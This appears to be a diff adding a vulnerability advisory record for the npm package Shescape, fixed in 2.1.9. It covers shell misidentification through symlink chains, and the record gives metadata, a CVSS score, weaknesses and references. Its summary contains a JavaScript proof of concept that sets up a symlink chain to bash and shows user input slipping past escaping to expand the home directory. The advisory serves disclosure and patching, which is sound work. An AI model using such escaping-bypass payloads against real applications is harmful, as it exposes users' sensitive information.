@@ -1,0 +1,93 @@
+advisory_id: npm/shescape/GHSA-6f6w-6j58-rq76
+datasource_id: gitlab/npm/shescape/GHSA-6f6w-6j58-rq76
+datasource_url: https://gitlab.com/gitlab-org/advisories-community/-/blob/main/npm/shescape/GHSA-6f6w-6j58-rq76.yml
+aliases:
+  - GHSA-6f6w-6j58-rq76
+summary: |
+  Shescape has possible misidentification of shell due to link chains
+  This impacts users of Shescape that configure their `shell` to point to a file on disk that is a link to a link. The precise result of being affected depends on the actual shell used and incorrect shell identified by Shescape.
+
+  In particular, an attacker may be able to bypass escaping for the shell being used. This can result, for example, in exposure of sensitive information, consider the following proof of concept (targeting Shescape v2):
+
+  ```javascript
+  import fs from "node:fs";
+  import { exec } from "node:child_process";
+
+  import { Shescape } from "shescape";
+  import which from "which";
+
+  /* 1. Set up */
+  const shell = which.sync("bash");
+  const linkToShell = "./csh";
+  const linkToLink = "./link";
+
+  fs.rmSync(linkToLink, { force: true });
+  fs.rmSync(linkToShell, { force: true });
+  fs.symlinkSync(shell, linkToShell);
+  fs.symlinkSync(linkToShell, linkToLink);
+
+  /* 2. Misconfiguration */
+  const execOptions = {
+  shell: linkToLink,
+  };
+
+  const shescape = new Shescape({
+  shell: execOptions.shell,
+  });
+
+  /* 3. Payload */
+  const userInput = "a=:~";
+
+  /* 4. Attack example */
+  exec(
+  `echo Hello ${shescape.escape(userInput)}`,
+  { shell: execOptions.shell },
+  (error, stdout) => {
+  fs.rmSync(linkToLink);
+  fs.rmSync(linkToShell);
+
+  if (error) {
+  console.error(`An error occurred: ${error}`);
+  } else {
+  console.log(stdout);
+  // Output:  "Hello a=:/home/user"
+  }
+  },
+  );
+  ```
+impacted_packages:
+  - purl: pkg:npm/shescape
+    affected_versions: vers:npm/<0.0.0
+    fixed_versions: vers:npm/2.1.9
+    affected_packages: []
+    fixed_packages:
+      - pkg:npm/shescape@2.1.9
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score:
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
+    published_at:
+    url: https://gitlab.com/gitlab-org/advisories-community/-/blob/main/npm/shescape/GHSA-6f6w-6j58-rq76.yml
+weaknesses:
+  - CWE-200
+  - CWE-1035
+  - CWE-937
+references:
+  - url: https://github.com/ericcornelissen/shescape
+    reference_type:
+    reference_id:
+  - url: https://github.com/ericcornelissen/shescape/pull/2388
+    reference_type:
+    reference_id:
+  - url: https://github.com/ericcornelissen/shescape/releases/tag/v2.1.9
+    reference_type:
+    reference_id:
+  - url: https://github.com/advisories/GHSA-6f6w-6j58-rq76
+    reference_type:
+    reference_id: GHSA-6f6w-6j58-rq76
+  - url: https://github.com/ericcornelissen/shescape/security/advisories/GHSA-6f6w-6j58-rq76
+    reference_type:
+    reference_id: GHSA-6f6w-6j58-rq76
+exploits: []
